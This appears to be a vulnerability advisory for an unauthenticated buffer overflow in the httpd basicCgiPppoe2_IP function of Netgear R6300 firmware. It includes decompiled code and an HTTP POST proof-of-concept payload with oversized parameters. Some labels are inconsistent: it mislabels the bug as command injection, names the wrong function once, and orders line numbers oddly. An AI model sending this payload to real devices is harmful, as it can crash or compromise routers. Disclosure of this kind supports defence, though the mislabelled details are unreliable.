# Buffer Overflow Vulnerability in `basicCgiPppoe2_IP`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`basicCgiPppoe2_IP`)                                |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameters `tempIP`, `endIP4`, `Protocol`, `policyIndex` |

2. Exploitation Path

```c
int __fastcall basicCgiPppoe2_IP(int a1, int a2)
{
  int v4; // $a1
  char v6[8]; // [sp+18h] [-138h] BYREF
  char v7[8]; // [sp+20h] [-130h] BYREF
  char v8[8]; // [sp+28h] [-128h] BYREF
  char v9[32]; // [sp+30h] [-120h] BYREF
  char v10[256]; // [sp+50h] [-100h] BYREF

  memset(v9, 0, sizeof(v9));
  memset(v6, 0, sizeof(v6));
  memset(v7, 0, sizeof(v7));
  memset(v10, 0, sizeof(v10));
  websGetVar(a1, "tempIP", v9);
  strcpy(v10, v9);
  strcat(v10, "-");
  websGetVar(a1, "endIP4", v6);
  strcat(v10, v6);
  websGetVar(a1, "Protocol", v7);
  strcat(v10, ",");
  strcat(v10, v7);
  websGetVar(a1, "policyIndex", v8);
  if ( v8[0] )
    v4 = atoi(v8);
  else
    v4 = 0;
  sub_42505C(v10, v4);
  sendPage2Client("BAS_basic.htm", a2);
  return 0;
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: Multiple buffer overflow vulnerabilities are present in the `basicCgiPppoe2_IP` function:
   - In the `basicCgiPppoe2_Port` function at line 14, `websGetVar(a1, "tempIP", v9)` retrieves user input into `v9`. The destination buffer `v9` is only **32 bytes**, while `websGetVar` allows inputs up to 255 bytes. This results in a buffer overflow vulnerability.
   - At line 17, `websGetVar(a1, "endIP4", v6)` retrieves user input into `v6`. The destination buffer `v6` is only **8 bytes**, while input length can reach 255 bytes, resulting in a buffer overflow vulnerability.
   - At line 19, `websGetVar(a1, "Protocol", v7)` retrieves user input into `v7`. The destination buffer `v7` is only **8 bytes**, causing a buffer overflow vulnerability.
   - At line 22, `websGetVar(a1, "policyIndex", v8)` retrieves user input into `v8`. The destination buffer `v8` is only **8 bytes**, leading to a buffer overflow vulnerability.
   - At line 21, `strcat(v10, v7)` appends user input into `v10`. Since `v10` is a **256-byte buffer** that has already been concatenated with `v6` at line 18 and a delimiter at line 20, repeated concatenations may exceed the buffer size, causing a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/basicCgiPppoe2_IP HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 1024
Connection: close

tempIP=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&endIP4=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
&Protocol=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
&policyIndex=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```